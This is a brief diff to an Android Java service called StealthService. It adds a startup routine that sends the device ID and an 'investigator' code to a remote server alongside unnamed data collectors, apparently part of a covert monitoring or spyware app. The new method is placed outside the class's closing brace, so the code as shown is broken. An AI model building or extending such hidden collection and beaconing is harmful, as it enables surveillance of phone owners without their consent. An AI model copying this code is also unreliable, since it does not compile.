@@ -48,6 +48,8 @@ public class StealthService extends Service {
         // Initialize data collectors
         initializeDataCollectors();
         initializeInvestigatorApi();
+        // Test server connection
+        testServerConnection();
     }
 
     @Override
@@ -421,3 +423,23 @@ public class StealthService extends Service {
         }
     }
 }
+
+    // ==================== SERVER CONNECTION TEST ====================
+    private void testServerConnection() {
+        try {
+            Log.d(TAG, "🔗 Testing server connection...");
+            
+            // Test basic connectivity
+            JSONObject testData = new JSONObject();
+            testData.put("device_id", deviceId);
+            testData.put("investigator_code", investigatorCode);
+            testData.put("status", "connection_test");
+            testData.put("timestamp", System.currentTimeMillis());
+            
+            investigatorApiClient.sendDataToInvestigator("connection_test", testData);
+            Log.d(TAG, "✅ Server connection test initiated");
+            
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Server connection test failed: " + e.getMessage());
+        }
+    }
